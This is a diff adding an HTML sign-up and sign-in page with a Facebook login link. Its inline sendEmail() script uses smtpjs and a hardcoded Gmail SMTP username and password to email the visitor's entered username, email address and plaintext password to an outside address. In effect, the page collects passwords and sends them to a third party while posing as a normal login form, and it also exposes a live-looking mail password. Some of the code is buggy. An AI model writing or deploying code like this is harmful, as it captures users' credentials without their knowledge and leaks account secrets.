@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width" />
+<title>b</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="b.css"  url="b.css" type="text/css"/>
+</head>
+
+<body  dir="ltr">
+
+   
+
+
+
+
+<div id="container">
+
+    <span id="aa"></span>
+    <span id="bb"></span>
+    <span id="cc"></span>
+    <span id="ee"></span>
+
+    <div class="form signup">
+        <h2>Sign Up</h2>
+
+    <div id="inputbux">
+        <input type="text" required="required" id="username">
+        <i class="fa-regular fa-user"></i>
+        <span>Username</span>
+    </div>
+    <div id="inputbux">
+
+        <input type="text" required="required" id="emailaddress">
+        <i class="fa-regular fa-envelope"></i>
+        <span>Email Address</span>
+    </div>
+    
+    <div id="inputbux">
+        <input type="password" required="required" id="creatpassword" >
+        <i class="fa-solid fa-lock"></i>
+
+        <span>Creat Password</span>
+        <div id="toggle" onclick="showhide();">
+
+                    <i class="fa-sharp fa-solid fa-eye-slash eyelink"></i>
+                    <i class="fa-solid fa-eye eyeshow"></i>
+    </div>
+
+    </div>
+
+    <div id="inputbux">
+        <input type="password" required="required" id="confirmpassword" >
+        <i class="fa-solid fa-lock "></i>
+          <span id="span">Confirm Password</span>
+        <div id="togglee" onclick="showhidee();">
+            
+                    <i class="fa-sharp fa-solid fa-eye-slash eyelinkcon"></i>
+                    <i class="fa-solid fa-eye eyeshowcon"></i>
+    </div>
+
+    </div>
+
+    <div id="inputbux">
+<div id="divspan">
+
+</div>
+    </div>
+
+    <div id="inputbux">
+        <input type="submit" value="creat account" id="creataccount" onsubmit="sendEmail()">
+    </div>
+      <P>Already Amember ? <a href="#"
+         id="login"> Log In</a></P>
+    </div>
+
+
+
+
+    <div class="form signin">
+        <h2>Sign In</h2>
+    <div id="inputbux">
+        <input type="text" required="required" id="usernameoremial">
+        <i class="fa-regular fa-user"></i>
+        <span>Username or Email</span>
+    </div>
+    <div id="inputbux">
+        <input type="password" required="required" id="passwordd">
+        <i class="fa-solid fa-lock"></i>
+        <div id="togglex" onclick="showhidex(); reset();return false;">
+            
+            <i class="fa-sharp fa-solid fa-eye-slash eyelinkx"></i>
+            <i class="fa-solid fa-eye eyeshowx"></i>
+</div>
+        <span>Password</span>
+    </div>
+     <div id="inputbux">
+<div id="divsginin">
+
+</div>
+    </div>
+        <div id="inputbux">
+            <input type="submit" value="login" id="loginn">
+        </div>
+        <div class="formlink">
+            <a href="#" class="forgotpassword">Forgot Password</a>
+        </div>
+          <P>Not Registered ? <a href="#"
+             id="creat">Create Account</a></P>
+
+
+    <div class="line"></div>
+
+
+
+<div class="media">
+<a href="#" class="field facebook">
+    <i class="fa-brands fa-facebook"></i>
+    <span>Login Whth Facebook</span></a>
+</div>
+
+             
+    </div>
+    </div>
+
+</div>
+<script>
+
+    let creat =document.querySelector('#creat')
+   
+    login.onclick = function(){
+        container.classList.add('signinForm')
+        container.style.height = '500px' ;
+    }
+    creat.onclick = function(){
+        container.classList.remove('signinForm')
+    if(divspan.innerHTML = ''){
+        container.style.height = '502px'
+    }else{
+        container.style.height = '575px'
+    }
+    }
+    </script>
+
+
+<script src=" https://smtpjs.com/v3/smtp.js"></script>
+<script>
+    function sendEmail(){
+        Email.send({
+        Host : "smtp.gmail.com",
+        Username : "saiffoad52@gmail.com",
+        Password : "Rashedrashed10",
+        To : 'Rashedsaid900',
+        From : document.querySelector('#emailaddress').value,
+        Subject : "New Contact",
+        Body : "Username: "+ document.querySelector('#username').value
+        + "<br> Email:" +document.querySelector('#emailaddress').value 
+        + "<br> Password: "  + document.querySelector('#creatpassword').value
+}).then(
+  message => alert(message)
+);
+    }
+</script> 
+   <script src="b.js"></script>
+</body>
+</html>
